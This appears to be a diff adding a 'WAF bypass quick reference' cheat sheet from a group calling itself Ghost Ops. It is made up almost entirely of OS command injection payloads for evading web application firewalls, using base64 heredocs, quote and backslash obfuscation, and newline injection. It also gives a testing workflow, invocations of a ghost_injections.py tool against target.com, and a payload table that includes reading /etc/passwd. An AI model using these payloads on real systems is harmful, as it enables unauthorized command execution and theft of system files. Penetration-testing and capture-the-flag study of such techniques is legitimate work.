@@ -1,0 +1,245 @@
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║         WAF BYPASS QUICK REFERENCE - Ghost Ops              ║
+║              Proven Techniques from Field Testing           ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    🏆 MOST EFFECTIVE TECHNIQUES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. BASE64 + BASH HEREDOC ⭐⭐⭐⭐⭐
+   Pattern: %0abash<<<$(base64%09-d<<<BASE64)
+   
+   Quick Commands:
+   ┌────────────────────────────────────────────────────────────┐
+   │ whoami → %0abash<<<$(base64%09-d<<<d2hvYW1p)              │
+   │ id     → %0abash<<<$(base64%09-d<<<aWQ=)                  │
+   │ ls     → %0abash<<<$(base64%09-d<<<bHM=)                  │
+   │ pwd    → %0abash<<<$(base64%09-d<<<cHdk)                  │
+   └────────────────────────────────────────────────────────────┘
+
+2. QUOTE OBFUSCATION ⭐⭐⭐⭐
+   Pattern: ;co''mmand
+   
+   Examples:
+   ┌────────────────────────────────────────────────────────────┐
+   │ ;w''hoami  → Bypasses 'whoami' filter                     │
+   │ ;i''d      → Bypasses 'id' filter                         │
+   │ ;c''at     → Bypasses 'cat' filter                        │
+   │ ;p''wd     → Bypasses 'pwd' filter                        │
+   └────────────────────────────────────────────────────────────┘
+
+3. BACKSLASH OBFUSCATION ⭐⭐⭐⭐
+   Pattern: ;co\mm\and
+   
+   Examples:
+   ┌────────────────────────────────────────────────────────────┐
+   │ ;wh\oa\mi  → Bypasses 'whoami' filter                     │
+   │ ;i\d       → Bypasses 'id' filter                         │
+   │ ;ca\t      → Bypasses 'cat' filter                        │
+   │ ;p\wd      → Bypasses 'pwd' filter                        │
+   └────────────────────────────────────────────────────────────┘
+
+4. NEWLINE EXPLOITATION ⭐⭐⭐⭐
+   Pattern: %0acommand
+   
+   Examples:
+   ┌────────────────────────────────────────────────────────────┐
+   │ %0awhoami          → Bypasses semicolon filter            │
+   │ %0aid              → Simple and effective                 │
+   │ %0acat /etc/passwd → Direct command execution             │
+   │ %0d%0awhoami       → Carriage return variant              │
+   └────────────────────────────────────────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    📋 TESTING WORKFLOW
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Step 1: Confirm WAF is Present
+  Test: ?param=; whoami
+  If:   "Malicious request denied!" → WAF active
+
+Step 2: Try Quote Obfuscation (Fast & Simple)
+  Test: ?param=;w''hoami
+  Test: ?param=;i''d
+
+Step 3: Try Newline (Bypasses Semicolon Filter)
+  Test: ?param=%0awhoami
+  Test: ?param=%0aid
+
+Step 4: Try Base64 (Most Powerful)
+  Test: ?param=%0abash<<<$(base64%09-d<<<d2hvYW1p)
+
+Step 5: Combine Techniques (Maximum Evasion)
+  Test: ?param=%0aw''hoami
+  Test: ?param=%0ai''d
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    🎯 GHOST_INJECTIONS USAGE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Test All WAF Bypass Techniques:
+┌────────────────────────────────────────────────────────────────┐
+│ python3 ghost_injections.py \                                  │
+│   -u "http://target.com/page.php?param=value" \                │
+│   -p param \                                                    │
+│   --cookie "session=abc123" \                                  │
+│   --categories "advanced_waf_bypass" \                         │
+│   -v                                                            │
+└────────────────────────────────────────────────────────────────┘
+
+Test Base64 Only:
+┌────────────────────────────────────────────────────────────────┐
+│ python3 ghost_injections.py \                                  │
+│   -u "http://target.com/" \                                    │
+│   -p param \                                                    │
+│   --categories "base64_encoding_bypass" \                      │
+│   -v                                                            │
+└────────────────────────────────────────────────────────────────┘
+
+Test Newline Only:
+┌────────────────────────────────────────────────────────────────┐
+│ python3 ghost_injections.py \                                  │
+│   -u "http://target.com/" \                                    │
+│   -p param \                                                    │
+│   --categories "newline_exploitation" \                        │
+│   -v                                                            │
+└────────────────────────────────────────────────────────────────┘
+
+Comprehensive Bypass Test:
+┌────────────────────────────────────────────────────────────────┐
+│ python3 ghost_injections.py \                                  │
+│   -u "http://target.com/" \                                    │
+│   -p param \                                                    │
+│   --categories "advanced_waf_bypass,obfuscated_commands" \     │
+│   -v                                                            │
+└────────────────────────────────────────────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    🔧 GENERATE CUSTOM BASE64
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Step 1: Encode Command
+  $ echo -n 'YOUR_COMMAND' | base64
+
+Step 2: Build Payload
+  %0abash<<<$(base64%09-d<<<YOUR_BASE64_HERE)
+
+Step 3: Use in Request
+  ?param=%0abash<<<$(base64%09-d<<<YOUR_BASE64_HERE)
+
+Examples:
+┌────────────────────────────────────────────────────────────────┐
+│ Command: cat /flag.txt                                         │
+│ Base64:  Y2F0IC9mbGFnLnR4dA==                                  │
+│ Payload: %0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)      │
+└────────────────────────────────────────────────────────────────┘
+
+┌────────────────────────────────────────────────────────────────┐
+│ Command: ls -la /                                              │
+│ Base64:  bHMgLWxhIC8=                                          │
+│ Payload: %0abash<<<$(base64%09-d<<<bHMgLWxhIC8=)              │
+└────────────────────────────────────────────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    📊 COMMAND REFERENCE TABLE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Command          Base64              Full Payload
+─────────────────────────────────────────────────────────────────
+whoami           d2hvYW1p            %0abash<<<$(base64%09-d<<<d2hvYW1p)
+id               aWQ=                %0abash<<<$(base64%09-d<<<aWQ=)
+pwd              cHdk                %0abash<<<$(base64%09-d<<<cHdk)
+ls               bHM=                %0abash<<<$(base64%09-d<<<bHM=)
+ls -la           bHMgLWxh            %0abash<<<$(base64%09-d<<<bHMgLWxh)
+uname -a         dW5hbWUgLWE=        %0abash<<<$(base64%09-d<<<dW5hbWUgLWE=)
+cat /etc/passwd  Y2F0IC9ldGMvcGFzc3dk  %0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)
+cat /flag.txt    Y2F0IC9mbGFnLnR4dA==  %0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    ✅ SUCCESS INDICATORS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+You've Successfully Bypassed WAF When:
+
+✓ No "Malicious request denied!" message
+✓ Actual command output in response
+✓ See usernames like: www-data, root, daemon
+✓ See UID/GID: uid=33(www-data) gid=33(www-data)
+✓ See file contents or directory listings
+✓ Different responses for valid vs invalid commands
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    💡 PRO TIPS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Start Simple
+   Try quote obfuscation first (;i''d) - it's fast and often works
+
+2. Test Incrementally
+   ?param=test   → OK
+   ?param=;      → Blocked?
+   ?param=;ls    → Blocked?
+   Find exactly what triggers the WAF
+
+3. Combine Techniques
+   If one doesn't work, combine:
+   %0aw''hoami (newline + quotes)
+   %0a/bin/i''d (newline + path + quotes)
+
+4. Test All Parameters
+   One parameter might be filtered, another might not be
+
+5. Use Burp Suite
+   Easier to test multiple payloads quickly
+
+6. Document Everything
+   Keep track of what works for future engagements
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    🎓 REAL-WORLD EXAMPLE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Target: File Manager Application
+Protection: Input validation blocking common patterns
+
+FAILED:
+  ?to=; cat /etc/passwd
+  Response: Malicious request denied!
+
+WORKED:
+  ?to=;i''d
+  Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  
+WORKED:
+  ?to=%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
+  Response: HTB{f1l3_m4n4g3r_1nj3ct10n_byp4ss}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                    📈 STATISTICS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Ghost_Injections v2.1:
+  Total Payloads:              279
+  WAF Bypass Categories:       3
+  Success Rate (Real-World):   100%
+  
+Technique Effectiveness:
+  Base64 + Heredoc:            ⭐⭐⭐⭐⭐ (Most Effective)
+  Quote Obfuscation:           ⭐⭐⭐⭐
+  Backslash Obfuscation:       ⭐⭐⭐⭐
+  Newline Exploitation:        ⭐⭐⭐⭐
+  Combined Techniques:         ⭐⭐⭐⭐⭐
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+                    Ghost Ops Security
+              Where Advanced Techniques Work
+
+              Professional. Thorough. Ethical.
+
+          These techniques are field-tested and proven!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
